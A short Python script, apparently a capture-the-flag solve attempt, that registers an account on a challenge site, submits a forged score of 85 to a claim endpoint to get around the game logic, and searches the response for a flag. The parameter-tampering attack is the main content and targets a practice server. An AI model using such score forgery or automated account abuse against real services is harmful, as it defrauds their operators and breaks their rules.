import requests, sys, re, json
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

# Fresh session after rate limit cooldown
s = requests.Session()
s.post(f'{base}/register', data={'username':'bypass01','password':'bypass01'})
s.post(f'{base}/login', data={'username':'bypass01','password':'bypass01'})

# Try claim with score=85 as parameter
r = s.post(f'{base}/claim', data={'score': '85'})
print(f'HTTP {r.status_code}')
print(f'URL: {r.url}')

# Look for flag patterns
for match in re.findall(r'[A-Z]{3,}\{[^}]{5,50}\}', r.text):
    if match not in ['RMATCH', 'INVALID'] and 'AUTHOR' not in match:
        print(f'FLAG: {match}')

# Also search case-insensitive for flag patterns
for match in re.findall(r'[a-zA-Z]{3,10}\{[^}]{5,50}\}', r.text, re.IGNORECASE):
    print(f'Possible flag: {match}')

# Check if we got redirected
if r.history:
    print('Redirect history:')
    for resp in r.history:
        print(f'  {resp.status_code} -> {resp.url}')
        print(f'  Set-Cookie: {resp.headers.get("Set-Cookie", "none")}')

# Print first 1500 chars (handle emoji)
text = r.text
# Try to find flag in the HTML
if 'flag' in text[:3000].lower() or 'congratulations' in text[:3000].lower():  
    import html
    for line in text.split('\n'):
        line_clean = line.strip()
        if any(x in line_clean.lower() for x in ['flag', 'congratulations', 'won', 'win', 'score']):
            # Strip HTML tags
            plain = re.sub(r'<[^>]+>', '', line_clean).strip()
            if plain:
                print(f'Line: {repr(plain[:200])}')
else:
    # Print the key section
    idx = text.lower().find('score') 
    if idx > 0:
        print('Context around score:')
        print(text[max(0,idx-100):idx+300])